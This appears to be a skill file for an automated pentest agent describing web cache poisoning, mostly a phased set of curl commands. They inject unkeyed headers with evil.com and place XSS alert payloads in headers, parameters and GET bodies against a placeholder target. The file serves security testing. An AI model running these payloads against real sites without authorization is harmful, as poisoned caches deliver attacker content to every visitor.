---
name: attack-cache-poison
description: "Web cache poisoning — unkeyed header/parameter injection to serve malicious content to all users"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - cache-poisoning
  - web
  - xss
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-444
  - CWE-525
chains_with:
  - attack-host-header
  - attack-open-redirect
prerequisites: []
severity_boost:
  attack-host-header: "Host header + cache = stored XSS/redirect affecting all users"
---

# Web Cache Poisoning

## Objective

Inject malicious content into cached responses via unkeyed inputs (headers, parameters) so that subsequent users receive the poisoned response.

## Testing Methodology

### Phase 1: Identify Cache Behavior

```bash
# Check cache headers
curl -s -D- https://TARGET/ | grep -i "x-cache\|age\|cache-control\|cf-cache\|x-varnish"

# Identify cache key components (vary header)
curl -s -D- https://TARGET/ | grep -i "vary"
```

### Phase 2: Find Unkeyed Inputs

Test headers that are reflected in response but NOT part of cache key:

```bash
# X-Forwarded-Host
curl -s https://TARGET/ -H "X-Forwarded-Host: evil.com" | grep "evil.com"

# X-Forwarded-Scheme
curl -s https://TARGET/ -H "X-Forwarded-Scheme: nothttps" | grep "redirect"

# X-Original-URL / X-Rewrite-URL
curl -s https://TARGET/ -H "X-Original-URL: /admin"

# Custom headers
curl -s https://TARGET/ -H "X-Forwarded-Port: 1234"
```

### Phase 3: Cache Poisoning via Unkeyed Header

```bash
# Poison with XSS payload
curl -s https://TARGET/ \
  -H "X-Forwarded-Host: evil.com\"><script>alert(1)</script>"

# Wait for cache to store, then verify
curl -s https://TARGET/ | grep "alert(1)"
```

### Phase 4: Unkeyed Parameter Poisoning

```bash
# Find parameters not in cache key
curl -s "https://TARGET/?cb=123" -D- | grep "x-cache"
curl -s "https://TARGET/?utm_source=evil" | grep "evil"

# Reflected unkeyed parameter → stored XSS
curl -s "https://TARGET/?evil=<script>alert(1)</script>"
```

### Phase 5: Fat GET / POST-based Poisoning

```bash
# Fat GET — body in GET request
curl -s https://TARGET/ -X GET -d "param=<script>alert(1)</script>"

# POST → GET cache confusion
curl -s https://TARGET/ -X POST \
  -H "X-HTTP-Method-Override: GET" \
  -d "param=evil"
```

### Phase 6: Cache Key Normalization

```bash
# Path normalization differences
curl -s "https://TARGET/path/../admin"
curl -s "https://TARGET/PATH" vs "https://TARGET/path"
curl -s "https://TARGET/path;.js"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Cached XSS payload served to other users | Critical (P1) |
| Cached redirect to attacker domain | High (P2) |
| Denial of service via cache poisoning (error page cached) | Medium (P3) |
| Unkeyed header reflected (no cache impact proven) | Low (P4) |

## Evidence Requirements

- Unkeyed input identified (header or parameter)
- Response showing injected content
- Cache headers proving response was cached (X-Cache: HIT, Age > 0)
- Second request (clean) still receiving poisoned content
- Impact: XSS, redirect, or DoS

## References

- [PortSwigger: Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [James Kettle: Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
